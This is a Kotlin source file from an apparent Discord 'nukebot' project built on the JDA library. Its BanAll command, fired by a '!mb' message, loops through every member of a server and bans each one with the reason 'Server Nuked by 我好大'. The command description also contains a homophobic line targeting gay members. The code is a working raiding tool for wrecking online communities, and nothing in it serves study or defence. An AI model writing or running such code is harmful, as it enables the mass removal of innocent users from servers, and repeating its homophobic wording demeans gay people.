package thenano.nukebot.bot.command.commands

import net.dv8tion.jda.api.Permission
import net.dv8tion.jda.api.events.message.MessageReceivedEvent
import net.dv8tion.jda.api.exceptions.PermissionException
import thenano.nukebot.bot.command.CommandListener
import thenano.nukebot.bot.command.CommandManager

@CommandListener.Info("!ban","Ban All gay in this server",false)
class BanAll : CommandListener() {

    override fun onEvent(event: MessageReceivedEvent) {
        if (onInit(event)) return
        if (message.contentRaw.startsWith("!mb")) {
            if (guild.selfMember.hasPermission(Permission.BAN_MEMBERS)) {
                message.reply("Banning").queue()
                loop1@ for (member in guild.members) {
                    try {
                        guild.ban(member, 1, "Server Nuked by 我好大").queue()
                        println("Banned " + member.user.asTag)
                    } catch (e: PermissionException) {
                        println("Cannot ban " + member.user.asTag + "- PermissionException")
                    }
                    if (CommandManager.stop) break@loop1
                }
            } else {
                message.reply("Permission missing(ban member").queue()
                message.delete().queue()
            }
        }
    }
}
